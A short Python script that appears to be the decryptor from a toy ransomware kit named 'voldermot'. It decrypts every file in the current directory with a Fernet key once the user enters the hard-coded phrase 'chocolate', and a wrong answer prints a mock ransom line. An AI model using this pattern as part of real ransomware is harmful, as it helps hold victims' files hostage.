#!/usr/bin/env python

import os
from cryptography.fernet import Fernet

# Let's find some files
files = []

# List all files in the current directory
for file in os.listdir():
    # Skip the script file itself and the key file
    if file in ["voldermot.py", "thekey.key", "encrypt.py", "decrypt.py"]:
        continue
    # Check if it's a file and not a directory
    if os.path.isfile(file):
        files.append(file)

print("Files to decrypt:", files)

# Read the secret key from a file
with open("thekey.key", "rb") as key_file:
    secretkey = key_file.read()

# Define the secret phrase
secretphrase = "chocolate"

# Ask the user for the secret phrase
user_phrase = input("Enter the secret phrase to decrypt your files:\n")

# Decrypt files if the correct secret phrase is entered
if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        try:
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            print(f"Decrypted {file}")
        except Exception as e:
            print(f"Failed to decrypt {file}: {e}")
    print("Congrats, your files are decrypted. Enjoy your chocolate!")
else:
    print("Sorry, wrong secret phrase. Send me more chocolate.")

